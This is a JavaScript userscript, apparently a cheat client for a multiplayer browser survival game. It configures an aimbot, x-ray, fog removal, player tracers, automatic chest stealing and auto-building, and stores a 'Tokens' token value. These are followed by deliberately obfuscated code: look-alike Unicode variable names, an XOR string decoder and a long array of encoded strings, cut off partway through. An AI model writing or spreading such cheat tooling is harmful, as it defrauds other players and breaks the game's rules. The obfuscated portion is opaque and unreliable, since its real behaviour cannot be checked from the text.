	(function() {
		let engineActive = false;
		let autoCrownReady = true;
		let autoFeedReady = true;
		const saveKey = "exclusivev2";
		const JoinedPlayers = [];
		const KilledPlayers = [];
		const SandstormImage = new Image;
		SandstormImage.src = "https://raw.githubusercontent.com/XmreLoux/images/main/sandstorm.png";
		const BlizzardImage = new Image;
		BlizzardImage.src = "https://raw.githubusercontent.com/XmreLoux/images/main/blizzard.png";
		const Timers = {
			HealTimer: 10,
			GaugeTimer: 5
		};
		const Packets = {
			TakeChest: 8,
			TakeOven: 13,
			TakeWindmill: 4,
			TakeExtractor: 37,
			PutExtractor: 27,
			UnlockChest: 20,
			Craft: 26,
			Recycle: 18,
			SendBuild: 22,
			GiveWheatWindmill: 30,
			GiveWoodOven: 14,
			GiveFlourOven: 25,
			DropAll: 31,
			Equip: 34,
			Resurrection: 35,
			JoinTeam: 17,
			SendAttack: 36,
			StopAttack: 16,
			Move: 11,
			Focus: 9,
			GiveItem: 1
		};
		const Stamps = {
			AutoSteal: Date.now(),
			AutoBreadTake: Date.now(),
			AutoBreadPut: Date.now(),
			AutoExtractorTake: Date.now(),
			AutoExtractorPut: Date.now(),
			AutoCraft: Date.now(),
			AutoRecycle: Date.now(),
			AutoSpike: Date.now(),
			AutoWall: Date.now(),
			DropSword: Date.now(),
			AutoFire: Date.now(),
			AutoCrown: Date.now(),
			AutoTotem: Date.now(),
			AutoFarm: Date.now(),
			AutoSeed: Date.now(),
			AutoBuild: Date.now(),
			AutoIce: Date.now(),
			AutoFeed: Date.now(),
			ZMA: Date.now(),
			BottleHeal: Date.now(),
			autoBand: Date.now(),
			GoToLobby: Date.now(),
			XDLOLXD: Date.now(),
			crownHeal: Date.now(),
		};
		window.Settings = {
			VehicleOpacity: {
				enabled: true,
				draw: false,
				e: true,
			},
			GhostInfo: {
				enabled: true,
				draw: false,
			},
			Equip: {
				enabled: false,
				draw : false,
			},
			XDLOLXD: {
				enabled: true,
				draw: false,
			},
			Totem: {
				enabled: true,
				draw: false,
				x: null,
				y: null
			},
			Death: {
				enabled: true,
				draw: false,
				x: null,
				y: null,
			},
			AutoRespawn: {
				enabled: false,
				draw: false,
			},	
			ZMApath: {
				enabled: false,
				draw: true,
			},
			ShowLevel: {
				enabled: true,
				draw: false,
			},
			GoToLobby: {
				enabled: false,
				draw: false,
				keyMode: "hold",
				key: "NONE",
				pushToBinds: true,
			},
		LBscore: {
			enabled: true,
			draw: false,
		},
		HideGUI: {
				enabled: false,
				draw: false,
				key: "none",
				keyMode: "press",
				pushToBinds: true,
			},
			autoBand: {
				enabled: false,
				draw: true,
			},
			ZMA: {
				enabled: false,
				draw: true,
			},
			Tokens: {
				enabled: false,
				token: null,
				tokenid: null,
			},
			crownHeal: {
				enabled: false,
				draw: true,
			},
			Skin: 0,
			BottleHeal: {
				enabled: false,
				draw: true,
				key: "ShiftLeft",
				pushToBinds: true,
			},
			PlayerTracers: {
				enabled: true
			},
			KrakenTracers: {
				enabled: true
			},
			SandwormTracers: {
				enabled: true
			},
			PlayerOnTop: {
				enabled: true
			},
			BoxOnTop: {
				enabled: true
			},
			ListEnabledHacks: {
				enabled: true
			},
			ShowJoinLeaves: {
				enabled: true
			},
			Roofs: {
				enabled: true
			},
			ShowHP: {
				enabled: true
			},
			Debugger: {
				enabled: false
			},
			ColoredSpikes: {
				enabled: true,
				textures: "1"
			},
			Timers: {
				enabled: true
			},
			WeatherInfo: {
				enabled: true
			},
			ExtractorInfo: {
				enabled: true
			},
			ChestInfo: {
				enabled: true
			},
			BoxInfo: {
				enabled: true
			},
			WindmillInfo: {
				enabled: true
			},
			OvenInfo: {
				enabled: true
			},
			TotemInfo: {
				enabled: true
			},
			FurnaceInfo: {
				enabled: true
			},
			MachineInfo: {
				enabled: true
			},
			ShowHoodNames: {
				enabled: false
			},
			NoFog: {
				enabled: true
			},
			Xray: {
				enabled: false,
				draw: true,
				key: "Semicolon",
				keyMode: "press",
				pushToBinds: true
			},
			XrayOpacity: .4,
			RoofsOpacity: .4,
			AutoBook: {
				enabled: true
			},
			AutoTotem: {
				enabled: false,
				draw: true,
				key: "KeyH",
				keyMode: "press",
				pushToBinds: true
			},
			AutoCraft: {
				enabled: false,
				draw: true,
				key: "KeyK",
				keyMode: "press",
				last: null,
				pushToBinds: true
			},
			AutoRecycle: {
				enabled: false,
				draw: true,
				key: "KeyL",
				keyMode: "press",
				last: null,
				pushToBinds: true
			},
			AutoCrown: {
				enabled: false,
				draw: false
			},
			AimBot: {
				enabled: false,
				draw: true,
				key: "KeyF",
				keyMode: "press",
				pushToBinds: true,
				angle: null
			},
			AutoSteal: {
				enabled: false,
				draw: true,
				key: "KeyQ",
				keyMode: "hold"
			},
			AutoBreadTake: {
				enabled: false,
				draw: true,
				key: "NONE",
				keyMode: "press",
				pushToBinds: true
			},
			AutoBreadPut: {
				enabled: false,
				draw: true,
				key: "NONE",
				keyMode: "press",
				pushToBinds: true
			},
			AutoExtractorTake: {
				enabled: false,
				draw: true,
				key: "NONE",
				keyMode: "press",
				pushToBinds: true
			},
			AutoExtractorPut: {
				enabled: false,
				draw: true,
				key: "NONE",
				keyMode: "press",
				pushToBinds: true
			},
			AutoFeed: {
				enabled: true
			},
			AutoIce: {
				enabled: true
			},
			DropSword: {
				enabled: false,
				draw: true,
				key: "NONE",
				keyMode: "hold",
				pushToBinds: true
			},
			AutoFire: {
				enabled: false,
				draw: true,
				key: "KeyV",
				keyMode: "hold",
				pushToBinds: true
			},
			AutoBuild: {
				enabled: false,
				draw: true,
				key: "KeyT",
				keyMode: "press",
				build: "Roofs",
				pushToBinds: true
			},
			AutoSeed: {
				enabled: false,
				draw: true,
				key: "NONE",
				keyMode: "press",
				seed: "Auto",
				pushToBinds: true
			},
			AutoWall: {
				enabled: false,
				draw: true,
				key: "KeyC",
				mode: true,
				keyMode: "hold"
			},
			AutoSpike: {
				enabled: false,
				draw: true,
				key: "Space",
				keyMode: "hold",
				mode: true,
				priority: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"]
			},
			SmartCraft: {
				enabled: false,
				draw: true,
				key: "NONE",
				keyMode: "press",
				select: "REIDITE_SPIKE",
				hm: 255
			},
			Spectator: {
				enabled: false,
				draw: true,
				key: "KeyP",
				keyMode: "press",
				speed: .5
			},
			AutoFarm: {
				enabled: false,
				draw: true,
				key: "KeyU",
				keyMode: "press",
				angle: null,
				water: false,
				x: null,
				xx: null,
				y: null,
				yy: null,
				sy: null,
				sx: null,
				pushToBinds: true
			},
			AutoSeedG: true,
			AutoUnlock: true,
			AutoExtractorPutMax: 255,
			BreadPutMax: 31,
			WindmillPutMax: 255,
			PutInChest: 10
		};

		function loadSettings() {
			for (const property in Settings) {
				const data = localStorage.getItem(property + saveKey);
				if (data) Settings[property] = JSON.parse(data)
			}
		}

		function saveSettings() {
			for (const property in Settings) {
				localStorage.setItem(property + saveKey, JSON.stringify(Settings[property]))
			}
		}
		loadSettings();
		var ⲆⵠΔᐃΔΔΔⲆΔ, ΔᐃᐃΔᐃᐃΔ, ᐃⵠⲆᐃΔⲆΔⵠⵠ, ᐃᐃⵠⵠᐃⲆⵠ;
		const ᐃⲆᐃΔᐃⵠᐃ = window;
		var ⵠⵠⲆᐃΔᐃᐃ = 152;
		var ΔᐃᐃᐃⲆᐃⲆⲆΔ = 97;
		if (ΔᐃᐃᐃⲆᐃⲆⲆΔ === 2) ΔᐃᐃᐃⲆᐃⲆⲆΔ = 37;
		if (ⵠⵠⲆᐃΔᐃᐃ > 13) ⵠⵠⲆᐃΔᐃᐃ = 11;
		var ᐃⲆᐃⲆⵠᐃΔᐃⵠ = 39;
		let ⲆΔⵠⲆⲆⲆⲆⲆⵠ = 92;
		const ⲆᐃⲆΔⲆⵠⲆΔᐃ = 136;
		var ⲆᐃⵠᐃⲆΔᐃᐃΔ = 214 - 58;
		var ⵠⵠᐃⵠΔᐃᐃΔΔ = 68;
		var ᐃⵠⵠⵠⲆⲆᐃ = 17;
		var ΔΔⲆⵠΔⲆⵠΔⲆ = {};
		ΔΔⲆⵠΔⲆⵠΔⲆ.ΔᐃⲆⵠᐃⲆⲆ = 3;
		if (ᐃⵠⵠⵠⲆⲆᐃ == 10) ᐃⵠⵠⵠⲆⲆᐃ = 56;
		var ⵠⵠⵠⵠⵠⵠΔΔᐃ = 213;
		var ⵠⲆᐃᐃⲆᐃⲆΔΔ = 205;
		let ⲆⵠᐃⵠΔⲆᐃⵠⵠ = 106;
		if (ⵠⲆᐃᐃⲆᐃⲆΔΔ === ⲆⵠᐃⵠΔⲆᐃⵠⵠ) ⵠⵠⵠⵠⵠⵠΔΔᐃ = 211;
		if (ⵠⵠᐃⵠΔᐃᐃΔΔ >= 12) ⵠⵠᐃⵠΔᐃᐃΔΔ = 223;
		const ᐃΔⵠⵠⲆᐃⲆ = 53 - 20;
		if (ⲆΔⵠⲆⲆⲆⲆⲆⵠ >= ⲆᐃⲆΔⲆⵠⲆΔᐃ) ᐃⲆᐃⲆⵠᐃΔᐃⵠ = 168;
		var ΔⵠΔⲆⲆᐃΔⵠⲆ = 231;
		var ⵠᐃᐃᐃᐃⲆⵠ = 73 - 157;
		if (ΔⵠΔⲆⲆᐃΔⵠⲆ > 4) ΔⵠΔⲆⲆᐃΔⵠⲆ = 230;
		var ᐃᐃⲆⵠⲆⵠᐃΔⵠ = 157;
		var ⵠⵠᐃᐃΔᐃⲆ = 225;
		var ΔⵠⲆⲆⲆⲆΔ, ⲆᐃΔΔᐃᐃⲆⵠΔ, ⵠⵠⲆᐃᐃΔΔ;
		var ⲆⲆΔᐃⲆᐃⲆΔΔ = 39;
		if (ⲆⲆΔᐃⲆᐃⲆΔΔ >= 6) ⲆⲆΔᐃⲆᐃⲆΔΔ = 155;
		const ᐃᐃΔᐃΔΔⲆᐃⲆ = 137;
		var ⵠⵠⲆΔΔᐃΔ, ΔᐃⲆᐃΔᐃΔ, ΔΔⲆⵠⵠⵠⵠ, ⲆⲆⲆᐃⲆⵠⲆ;
		const ⲆᐃⲆΔⵠᐃᐃⲆⵠ = Math.floor(ᐃᐃΔᐃΔΔⲆᐃⲆ[ᐃᐃΔᐃΔΔⲆᐃⲆ.ᐃᐃΔᐃΔΔⲆᐃⲆ]);
		if (ⵠⵠᐃᐃΔᐃⲆ === 12) ⵠⵠᐃᐃΔᐃⲆ = 225;
		var ⵠΔⵠⵠⲆⵠᐃ = 139;
		var ᐃⵠΔⵠⵠᐃⲆᐃⵠ = 223;
		if (ᐃⲆᐃΔᐃⵠᐃ.ⵠᐃΔⵠ === ⲆⲆⲆᐃⲆⵠⲆ) ᐃⲆᐃΔᐃⵠᐃ.ⵠᐃΔⵠ = 204;
		const ⵠⲆΔⵠᐃᐃⲆ = 130;
		if (ᐃⵠΔⵠⵠᐃⲆᐃⵠ == ⵠⲆΔⵠᐃᐃⲆ) ⵠΔⵠⵠⲆⵠᐃ = 216;
		var ᐃⲆΔᐃⵠΔⵠ = 198;
		const ᐃⲆⵠⵠΔⲆⵠ = 224;
		const ⲆⲆⲆᐃᐃⲆⲆ = Math.floor(ᐃⲆⵠⵠΔⲆⵠ[ᐃⲆⵠⵠΔⲆⵠ.ᐃⲆⵠⵠΔⲆⵠ]);
		const ΔΔΔⵠᐃᐃⵠᐃᐃ = 118;
		const ⵠΔⵠⵠΔⵠⲆᐃⵠ = 150;
		const ⵠᐃΔᐃⲆᐃⵠᐃⲆ = Math.floor(ⵠΔⵠⵠΔⵠⲆᐃⵠ[ⵠΔⵠⵠΔⵠⲆᐃⵠ.ⵠΔⵠⵠΔⵠⲆᐃⵠ]);
		const ᐃⵠΔΔⲆᐃᐃ = 76;
		if (ΔΔΔⵠᐃᐃⵠᐃᐃ >= ᐃⵠΔΔⲆᐃᐃ) ᐃⲆΔᐃⵠΔⵠ = 75;
		let ⲆⲆⲆΔΔⲆᐃ = 116;
		var ΔΔᐃΔⵠⵠⵠⵠⲆ = 68;
		var ⲆⲆᐃⲆⵠⵠᐃ = 188;
		var ΔΔⵠᐃᐃᐃⲆᐃⲆ = 18;
		let ⲆⵠᐃⲆᐃᐃΔ = 99;
		if (ΔΔⵠᐃᐃᐃⲆᐃⲆ >= ⲆⵠᐃⲆᐃᐃΔ) ⲆⲆᐃⲆⵠⵠᐃ = 125;
		if (ⲆⲆⲆΔΔⲆᐃ >= ΔΔᐃΔⵠⵠⵠⵠⲆ) ᐃᐃⲆⵠⲆⵠᐃΔⵠ = 31;
		var ΔᐃⲆⵠΔᐃⲆ = 57;
		var ᐃᐃᐃᐃᐃⵠⵠⵠⲆ = 41;
		var ᐃᐃⵠᐃΔᐃⵠᐃⲆ = 237;
		const ᐃⲆΔᐃΔⲆⵠᐃⲆ = 140;
		if (ᐃᐃⵠᐃΔᐃⵠᐃⲆ == ᐃⲆΔᐃΔⲆⵠᐃⲆ) ᐃᐃᐃᐃᐃⵠⵠⵠⲆ = 19;
		var ⲆΔΔΔⵠΔⵠΔⵠ = 9;
		var ᐃΔⲆᐃᐃⲆⲆ = 151;
		if (ᐃΔⲆᐃᐃⲆⲆ > 1) ᐃΔⲆᐃᐃⲆⲆ = 211;
		const ⵠΔΔⵠⲆⵠⲆ = 91;
		let ΔⵠᐃⲆᐃⵠⲆ = 83;
		var ⲆΔⵠⲆᐃⲆⲆ = {};
		var ᐃⵠⵠᐃᐃᐃᐃⲆΔ = 236;
		var ΔⲆⵠⲆⵠᐃⲆ = 41;
		let ⵠΔⵠΔⲆⵠⵠᐃᐃ = 169;
		const ΔΔΔΔᐃΔⵠ = 40;
		if (ⵠΔⵠΔⲆⵠⵠᐃᐃ === ΔΔΔΔᐃΔⵠ) ΔⲆⵠⲆⵠᐃⲆ = 31;
		var ΔΔⲆᐃᐃⲆΔ = 35;
		let ⵠⲆᐃⲆⲆ = 40;
		var ⲆΔΔᐃⲆⲆⲆ = 148;
		if (ⲆΔΔᐃⲆⲆⲆ > 2) ⲆΔΔᐃⲆⲆⲆ = 45;
		if (ΔΔⲆᐃᐃⲆΔ === ⵠⲆᐃⲆⲆ) ᐃⵠⵠᐃᐃᐃᐃⲆΔ = 243;
		ⲆΔⵠⲆᐃⲆⲆ.ΔⲆᐃΔᐃⲆⲆ = 11;
		if (ⵠΔΔⵠⲆⵠⲆ === ΔⵠᐃⲆᐃⵠⲆ) ⲆΔΔΔⵠΔⵠΔⵠ = 251;
		const ᐃΔΔᐃⵠΔᐃᐃⵠ = 163;
		ᐃΔΔᐃⵠΔᐃᐃⵠ.ⵠⵠⲆⲆⵠⵠⵠⲆⵠ = 13;
		var ΔᐃᐃΔᐃⵠᐃⵠⵠ = 160 + 18;
		var ᐃⵠΔΔΔⵠΔⲆⲆ = 67;
		var ⵠΔΔΔⲆΔΔΔᐃ = 192 - 172;
		var ⵠᐃᐃΔⲆᐃⵠ = 217;
		const ᐃⵠᐃΔⲆⲆⲆ = 58;
		if (ⵠᐃᐃΔⲆᐃⵠ === ᐃⵠᐃΔⲆⲆⲆ) ᐃⵠΔΔΔⵠΔⲆⲆ = 174;
		var ⲆⲆΔΔⲆΔⵠ = 252;
		var ΔⵠΔⵠⲆⵠᐃ = 181;
		var ᐃⲆΔⵠΔΔⵠ = 209;
		var ᐃⵠᐃⲆⵠⵠⵠⲆⲆ = 215;
		var ΔΔᐃΔⵠⲆΔ = 29;
		if (ᐃⵠᐃⲆⵠⵠⵠⲆⲆ == ΔΔᐃΔⵠⲆΔ) ᐃⲆΔⵠΔΔⵠ = 151;
		let ᐃⲆΔⲆⲆᐃΔ = 206 + 192;
		if (ΔⵠΔⵠⲆⵠᐃ == 13) ΔⵠΔⵠⲆⵠᐃ = 171;
		var ΔᐃⵠᐃᐃⲆⲆ = 0;
		var ΔᐃⵠⵠⵠⵠΔ = 161;
		if (ΔᐃⵠⵠⵠⵠΔ > 13) ΔᐃⵠⵠⵠⵠΔ = 249;
		if (ΔᐃⵠᐃᐃⲆⲆ >= 8) ΔᐃⵠᐃᐃⲆⲆ = 160;
		let ⵠⵠΔⵠΔⵠΔᐃⵠ = 19;
		if (ⲆⲆΔΔⲆΔⵠ >= ⵠⵠΔⵠΔⵠΔᐃⵠ) ΔᐃⲆⵠΔᐃⲆ = 94;
		var ΔᐃⵠⵠⲆⵠᐃ = 182;
		if (ΔᐃⵠⵠⲆⵠᐃ > 11) ΔᐃⵠⵠⲆⵠᐃ = 249;
		let ΔⲆⲆᐃΔⵠᐃⲆΔ = 74;
		const ⲆⵠⲆⵠᐃⵠΔ = 173 + 82 << 9;
		const ⲆⵠΔΔⲆΔΔⵠΔ = function(ᐃⲆΔᐃⵠ) {
			let ⵠⲆⲆᐃΔⲆⲆ = "";
			for (let ⵠⵠⲆᐃⵠⲆⵠ = 0; ⵠⵠⲆᐃⵠⲆⵠ < ᐃⲆΔᐃⵠ["length"]; ⵠⵠⲆᐃⵠⲆⵠ++) ⵠⲆⲆᐃΔⲆⲆ += ᐃⲆᐃΔᐃⵠᐃ["String"]["fromCharCode"](ᐃⲆΔᐃⵠ[ⵠⵠⲆᐃⵠⲆⵠ] ^ ΔⲆⲆᐃΔⵠᐃⲆΔ++ % 255);
			return ⵠⲆⲆᐃΔⲆⲆ
		};
		var ᐃⵠⵠⵠᐃᐃⲆ = 25 + 179 << 0;
		const ⵠⲆΔΔⲆΔᐃ = 112 + 207 << 6;
		var ⵠⵠΔⲆⲆⵠⵠᐃⵠ = 27;
		let ⵠⲆⵠⲆⵠⲆᐃ = 10;
		let ⵠᐃⲆᐃⲆΔΔ = 32;
		if (ⵠⲆⵠⲆⵠⲆᐃ === ⵠᐃⲆᐃⲆΔΔ) ⵠⵠΔⲆⲆⵠⵠᐃⵠ = 210;
		var ᐃᐃᐃⲆᐃΔⲆ = 16;
		var ΔᐃᐃⵠᐃⲆⲆ = 241;
		const ⲆᐃΔΔΔⲆⵠ = 67;
		if (ΔᐃᐃⵠᐃⲆⲆ == ⲆᐃΔΔΔⲆⵠ) ᐃᐃᐃⲆᐃΔⲆ = 17;
		const ⵠΔⲆᐃⵠⲆΔⵠⵠ = 53 + 13 << 4;
		var ⲆΔⲆΔⲆⲆⲆⲆⲆ, ⵠⵠⲆⵠⲆΔᐃ, ⵠᐃΔⲆᐃⲆΔ;
		ΔᐃⲆⵠⲆⵠΔ = [
			[19, 26, 113, 112],
			[20, 30, 109, 108],
			[54, 97, 60, 37, 15, 101, 63, 100],
			[62, 3, 18, 49, 61, 52, 38, 15, 56, 52, 81, 85],
			[55, 63, 34, 16, 51, 51, 7, 80],
			[12, 93, 69, 29, 17, 29, 62, 3, 21, 16, 69, 68],
			[24, 22, 58, 79, 31, 40, 228, 233, 230, 196, 189, 252],
			[220, 223, 224, 254, 235, 211, 198, 225, 237, 248, 173, 172],
			[193, 196, 165, 253, 204, 165, 205, 164],
			[248, 204, 218, 234],
			[255, 199, 238, 238, 251, 246, 144, 152],
			[255, 149, 145, 218, 200, 152, 229, 144],
			[205, 157, 137, 200, 214, 242, 137, 136],
			[238, 134, 129, 192, 222, 243, 238, 205, 230, 141, 138, 169, 161, 241, 145, 248],
			[156, 245, 158, 249],
			[156, 249, 154, 164, 155, 253, 233, 187, 179, 225, 130, 229],
			[180, 128, 142, 177, 185, 232, 138, 164, 132, 137, 178, 141, 135, 171, 181, 216],
			[176, 176, 132, 156, 142, 175, 132, 175, 141, 129, 186, 153, 151, 162, 201, 200],
			[167, 154, 148, 151, 172, 172, 144, 136, 154, 68, 88, 50, 82, 92, 79, 127, 94, 80, 98, 55],
			[105, 75, 52, 100, 110, 103, 44, 47],
			[74, 38, 109, 102, 77, 79, 44, 42, 76, 93, 32, 35],
			[124, 19, 107, 72],
			[64, 22, 73, 72, 69, 79, 20, 23],
			[114, 30, 69, 66, 118, 2, 66, 15],
			[106, 89, 99, 0, 86, 111, 111, 67, 106, 15, 107, 71, 91, 45, 23, 23, 33, 51, 120, 123],
			[35, 15, 37, 62, 17, 27, 116, 127, 43, 17, 108, 111],
			[55, 19, 108, 0, 1, 29, 23, 14, 63, 20, 23, 46, 61, 13, 2, 95],
			[2, 35, 9, 19, 3, 41, 84, 87],
			[9, 59, 84, 92, 53, 38, 35, 4],
			[16, 25, 35, 12, 20, 63, 64, 15, 24, 78, 43, 43, 37, 216, 233, 178],
			[218, 211, 253, 245],
			[227, 207, 176, 222, 239, 196, 199, 254, 237, 253, 242, 175],
			[240, 166, 237, 230, 206, 170, 204, 167],
			[250, 219, 241, 240, 254, 225, 156, 159],
			[194, 201, 156, 214, 197, 207, 148, 151],
			[200, 193, 251, 212, 203, 247, 136, 203, 233, 229, 136, 139],
			[237, 214, 243, 214, 225, 228, 205, 210],
			[220, 135, 185, 170, 166, 149, 248, 251],
			[164, 165, 159, 178, 175, 155, 155, 180, 171, 149, 151, 167, 178, 131, 228, 190, 179, 159, 181, 172, 185, 183, 135, 167, 134, 183, 208, 142],
			[185, 137, 137, 149, 133, 169, 212, 215],
			[178, 187, 216, 128, 141, 183, 164, 207],
			[144, 153, 163, 158, 173, 176, 149, 174, 159, 187, 187, 206, 90, 80, 63, 62],
			[87, 105, 72, 87, 92, 110, 55, 54],
			[109, 63, 88, 58, 65, 35, 43, 120, 78, 68, 43, 42],
			[74, 94, 92, 43, 70, 76, 35, 34],
			[67, 76, 27, 18, 70, 72, 119, 26],
			[75, 26, 108, 82, 72, 108, 19, 18],
			[83, 118, 116, 3, 85, 116, 11, 10],
			[97, 97, 104, 83, 94, 87, 119, 2],
			[26, 115, 20, 115, 22, 18, 62, 43, 42, 30, 28, 62, 40, 5, 0, 12, 53, 7, 0, 59, 14, 101, 99, 63, 58, 14, 15, 102],
			[5, 5, 20, 53],
			[57, 83, 26, 19, 62, 50, 83, 87, 63, 56, 87, 86],
			[8, 37, 2, 24, 42, 32, 79, 78],
			[33, 48, 79, 61, 44, 21, 40, 47],
			[24, 79, 56, 15, 228, 192, 191, 190],
			[215, 210, 179, 183, 197, 243, 192, 201, 239, 227, 196, 231, 245, 192, 175, 174],
			[205, 194, 238, 224, 249, 222, 223, 166],
			[249, 220, 163, 162],
			[195, 146, 240, 218, 197, 242, 147, 201, 201, 254, 240, 158],
			[245, 250, 252, 196],
			[233, 223, 228, 131, 208, 242, 143, 194],
			[218, 138, 248, 211, 229, 143, 210, 143, 165, 144, 255, 254],
			[166, 130, 170, 178, 146, 159, 174, 187, 150, 133, 156, 160],
			[178, 150, 190, 166, 142, 128, 152, 191, 187, 152, 231, 230],
			[189, 138, 143, 226],
			[131, 166, 164, 154, 190, 178, 211, 215, 188, 132, 211, 128, 182, 188, 211, 210],
			[146, 194, 176, 195, 149, 162, 207, 130, 155, 142, 199, 198],
			[170, 170, 146, 117, 101, 70, 78, 125, 84, 94, 77, 113, 80, 82, 96, 49],
			[87, 60, 89, 32, 67, 69, 107, 120, 119, 65, 65, 109, 125, 95, 81, 41, 78, 73, 78, 29],
			[123, 117, 22, 79],
			[70, 20, 113, 24, 122, 125, 30, 28, 119, 118, 101, 2, 104, 101, 68, 9],
			[87, 113, 14, 82, 96, 98, 105, 76, 95, 12, 11, 125],
			[35, 113, 1, 40, 39, 33, 122, 117],
			[16, 36, 29, 33, 23, 35, 25, 41],
			[11, 5, 102, 62, 55, 100, 5, 52, 15, 12, 17, 22, 12, 108, 102, 20, 2, 37, 90, 17, 63, 49, 82, 88],
			[8, 61, 94, 7, 55, 54, 7, 32, 43, 21, 78, 73],
			[17, 27, 49, 11, 29, 45, 46, 65],
			[25, 76, 57, 240, 229, 197, 239, 241, 223, 241, 186, 181],
			[211, 205, 231, 246, 238, 201, 247, 248, 244, 195, 174, 169],
			[246, 251, 193, 236, 251, 169, 193, 240],
			[196, 201, 209, 144, 192, 245, 154, 209],
			[252, 203, 241, 198, 200, 253, 158, 253, 244, 246, 253, 223],
			[210, 223, 229, 222, 209, 247, 138, 133],
			[227, 215, 215, 201, 231, 255, 130, 253],
			[155, 133, 250, 247, 167, 161, 250, 245],
			[144, 157, 129, 182],
			[151, 150, 167, 188, 136, 165, 238, 233],
			[140, 228, 175, 174, 186, 232, 142, 225],
			[184, 138, 154, 221],
			[181, 181, 165, 212, 132, 167, 218, 213],
			[139, 173, 210, 130, 160, 186, 174, 205],
			[171, 159, 202, 158, 145, 174, 186, 197],
			[152, 162, 169, 144, 159, 166, 77, 60],
			[88, 68, 66, 53, 95, 86, 53, 52],
			[80, 76, 53, 103, 106, 88, 33, 125, 112, 125, 69, 40],
			[116, 80, 33, 119],
			[120, 41, 41, 116, 68, 72, 122, 87, 65, 78, 114, 20, 68, 74, 80, 95, 115, 124, 125, 16],
			[77, 29, 126, 72, 104, 100, 98, 64],
			[111, 96, 118, 9, 91, 99, 102, 81],
			[95, 104, 117, 59, 24, 27, 14, 117, 23, 42, 30, 36, 40, 120, 6, 33],
			[43, 27, 25, 108],
			[54, 27, 30, 61, 52, 57, 22, 41, 62, 28, 48, 43, 60, 56, 93, 92],
			[49, 52, 81, 85, 43, 51, 50, 43, 9, 5, 38, 5, 11, 62, 77, 76],
			[16, 52, 24, 0, 44, 34, 8, 15, 27, 44, 72, 64],
			[36, 56, 214, 235, 224, 177, 214, 233, 208, 209, 194, 195, 219, 185, 181, 249, 237, 200, 169, 228, 200, 196, 161, 165],
			[207, 192, 214, 239, 249, 236, 161, 160],
			[255, 200, 149, 212, 248, 251, 238, 253, 199, 240, 250, 153, 203, 234, 145, 144],
			[205, 157, 216, 193, 232, 221, 229, 136],
			[236, 239, 208, 206, 216, 136, 246, 141, 221, 200, 253, 252],
			[163, 148, 245, 173, 156, 245, 158, 157, 168, 156, 245, 187, 170, 136, 184, 161, 176, 190, 176, 147, 180, 186, 158, 176, 184, 156, 138, 182],
			[140, 178, 152, 151, 187, 187, 181, 215, 168, 162, 174, 144, 137, 134, 170, 216],
			[140, 221, 197, 135, 145, 180, 162, 128],
			[172, 154, 193, 140, 158, 186, 193, 192],
			[157, 50, 71, 118, 96, 67, 125, 106],
			[95, 57, 48, 96, 105, 62, 117, 125, 85, 71, 95, 34],
			[112, 39, 71, 111, 117, 42, 109, 118, 77, 91, 75, 42, 123, 97, 28, 31],
			[123, 21, 28, 81, 70, 127, 29, 23],
			[73, 107, 123, 67, 75, 113, 12, 15],
			[106, 83, 8, 11],
			[84, 10, 85, 79],
			[111, 14, 119, 79, 101, 23, 15, 114],
			[39, 28, 11, 42, 36, 35, 49, 34, 41, 33, 41, 127, 22, 7, 53, 62],
			[48, 19, 57, 35, 13, 47, 100, 103],
			[58, 27, 11, 46, 5, 82, 9, 82],
			[0, 35, 35, 31, 4, 90, 63, 32, 9, 2, 60, 83],
			[12, 66, 39, 66, 39, 35, 25, 5, 21, 63, 21, 0, 33, 43, 51, 8, 29, 237, 211, 248],
			[231, 182, 195, 255, 229, 239, 180, 183],
			[239, 190, 225, 229, 235, 215, 246, 175],
			[242, 195, 160, 236, 243, 223, 223, 239, 194, 174, 200, 163],
			[252, 146, 247, 215, 249, 229, 152, 155],
			[195, 239, 144, 154, 242, 251, 218, 147],
			[246, 131, 231, 203, 208, 134, 140, 207],
			[211, 239, 140, 209, 225, 235, 231, 206, 221, 173, 151, 169],
			[160, 169, 147, 178, 165, 251, 147, 166, 153, 148, 151, 162, 173, 190, 131, 159, 178, 140, 155, 230, 141, 143, 236, 182, 184, 187, 224, 227],
			[186, 164, 164, 223],
			[130, 172, 175, 138, 189, 143, 212, 215],
			[178, 187, 149, 130, 140, 158, 160, 207],
			[170, 154, 163, 198, 147, 191, 192, 143, 152, 139, 192, 195],
			[82, 84, 51, 82, 82, 67, 109, 58],
			[81, 59, 114, 103, 85, 85, 68, 92, 74, 70, 92, 35],
			[118, 66, 47, 124, 121, 78, 64, 46],
			[70, 47, 102, 105, 121, 76, 100, 80, 117, 23, 31, 83, 75, 110, 19, 81, 77, 117, 124, 67, 100, 2, 112, 95, 87, 88, 112, 7, 89, 110, 3, 78],
			[93, 101, 108, 83, 34, 16, 127, 126],
			[30, 29, 46, 43, 17, 121, 4, 61, 46, 26, 127, 39, 50, 60, 3, 110],
			[53, 2, 99, 45, 60, 30, 28, 46, 56, 26, 50, 55, 4, 38, 55, 94],
			[7, 87, 10, 81, 50, 56, 87, 86],
			[8, 0, 2, 3, 20, 6, 79, 78],
			[16, 50, 32, 13, 28, 56, 71, 70],
			[41, 78, 44, 6, 225, 214, 183, 237],
			[224, 194, 191, 240],
			[235, 228, 230, 229, 237, 197, 223, 178],
			[242, 252, 171, 160],
			[240, 221, 220, 231, 250, 200, 167, 166],
			[197, 175, 230, 247, 193, 246, 147, 207, 254, 228, 155, 154],
			[203, 154, 248, 221, 207, 236, 147, 146],
			[211, 131, 244, 129, 238, 228, 139, 138],
			[225, 139, 252, 206, 229, 143, 232, 204, 145, 150, 247, 179, 166, 146, 128, 247, 169, 158, 243, 190, 158, 163, 132, 167, 178, 134, 135, 238],
			[176, 157, 156, 191, 129, 235, 143, 230],
			[134, 133, 132, 179, 130, 143, 179, 222],
			[190, 173, 172, 143, 140, 217, 134, 159, 181, 186, 138, 131],
			[169, 195, 138, 159, 173, 173, 188, 162, 153, 174, 203, 151, 158, 206, 168, 48],
			[98, 74, 85, 126, 100, 71, 58, 53],
			[108, 91, 54, 49],
			[84, 60, 119, 96, 75, 69, 38, 36, 70, 81, 65, 104, 67, 40, 115, 44],
			[71, 121, 34, 29],
			[120, 122, 113, 20, 124, 113, 105, 90],
			[74, 71, 125, 95, 119, 121, 105, 74, 107, 99, 14, 9],
			[108, 4, 95, 80, 90, 81, 117, 74, 103, 121, 106, 125],
			[32, 21, 118, 49, 31, 30, 13, 1, 19, 29, 39, 34, 44, 6, 30, 109],
			[50, 21, 43, 60, 12, 100, 1, 55, 59, 104, 35, 55, 7, 6, 22, 93],
